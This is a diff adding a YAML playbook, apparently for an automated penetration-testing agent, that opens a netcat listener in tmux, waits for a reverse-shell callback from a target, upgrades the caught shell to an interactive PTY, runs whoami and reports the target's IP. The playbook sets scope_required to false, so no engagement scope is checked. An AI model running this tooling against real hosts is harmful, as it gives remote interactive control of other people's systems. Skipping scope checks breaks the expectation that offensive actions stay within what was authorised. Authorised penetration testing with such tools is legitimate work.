@@ -1,0 +1,88 @@
+name: reverse-shell-demo
+version: "0.1"
+description: "Manual-trigger reverse shell demo. Starts a listener and waits for a callback. Operator triggers the callback themselves from the target. Requires rlwrap, nc, tmux on Kali."
+scope_required: false
+allowed_risks: [medium]
+
+root_tasks:
+  - listener_start:
+      mission_short_id: "${MISSION_SHORT_ID}"
+      mission_range_offset: "${MISSION_RANGE_OFFSET}"
+      profile_callback_ip_or_empty: "${CALLBACK_IP}"
+      kali_host: "${CALLBACK_IP}"
+
+task_types:
+  listener_start:
+    consumes: {}
+    produces: [KaliSession, Shell]
+    tool: tmux
+    command_template: |
+      CALLBACK_IP="{profile_callback_ip_or_empty}"
+      if [ -z "$CALLBACK_IP" ]; then
+        CALLBACK_IP=$(ip -4 addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1)
+        [ -z "$CALLBACK_IP" ] && CALLBACK_IP=$(ip -4 route show default | awk '/src/{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}' | head -1)
+      fi
+
+      BASE={port_range_start}
+      RANGE={port_range_size}
+      PORT=""
+      for i in $(seq 0 $((RANGE-1))); do
+        P=$((BASE + (({mission_range_offset} * RANGE) + i) % 65000))
+        if ! ss -tln "sport = :$P" | grep -q ":$P"; then PORT=$P; break; fi
+      done
+      [ -z "$PORT" ] && { echo "FAIL no free port" >&2; exit 1; }
+
+      SID="agentsmith-{mission_short_id}-listen-$$"
+      tmux new-session -d -s "$SID" "rlwrap nc -lvnp $PORT 2>&1"
+      echo "LISTENING $SID $CALLBACK_IP $PORT"
+
+      DEADLINE=$(( $(date +%s) + {connect_timeout_s} ))
+      CONNECTED=0
+      while [ $(date +%s) -lt $DEADLINE ]; do
+        if tmux capture-pane -t "$SID" -p 2>/dev/null | grep -q "connect to \["; then
+          CONNECTED=1; break
+        fi
+        sleep 0.5
+      done
+      if [ $CONNECTED -eq 0 ]; then
+        tmux kill-session -t "$SID" 2>/dev/null
+        echo "FAIL no callback in {connect_timeout_s}s" >&2; exit 2
+      fi
+      echo "CAUGHT $SID"
+
+      tmux send-keys -t "$SID" 'python3 -c "import pty; pty.spawn(\"/bin/bash\")"' Enter
+      sleep 0.5
+      tmux send-keys -t "$SID" C-z
+      sleep 0.3
+      tmux send-keys -t "$SID" 'stty raw -echo; fg' Enter
+      sleep 0.3
+      tmux send-keys -t "$SID" 'export TERM=xterm; echo __INTERACTIVE_OK__' Enter
+      sleep 0.5
+
+      INTERACTIVE=0
+      tmux capture-pane -t "$SID" -p | grep -q "__INTERACTIVE_OK__" && INTERACTIVE=1
+
+      NONCE="_W_$RANDOM"
+      tmux send-keys -t "$SID" "whoami; echo __END_$NONCE" Enter
+      sleep 0.5
+      USER_LINE=$(tmux capture-pane -t "$SID" -p | grep -B1 "__END_$NONCE" | head -1 | tr -d '[:space:]')
+
+      TARGET_IP=$(tmux capture-pane -t "$SID" -p -S - | grep -o 'from [0-9.]*' | head -1 | awk '{print $2}')
+      [ -z "$TARGET_IP" ] && TARGET_IP="unknown"
+
+      echo "READY $SID $CALLBACK_IP $PORT $USER_LINE $INTERACTIVE $TARGET_IP"
+    args_template:
+      mission_short_id: "{mission_short_id}"
+      mission_range_offset: "{mission_range_offset}"
+      profile_callback_ip_or_empty: "{profile_callback_ip_or_empty}"
+      port_range_start: "4400"
+      port_range_size: "10"
+      connect_timeout_s: "120"
+      kali_host: "{kali_host}"
+    parser: listener
+    timeout: 180
+
+expansions: []
+
+terminations:
+  - scope_exhausted
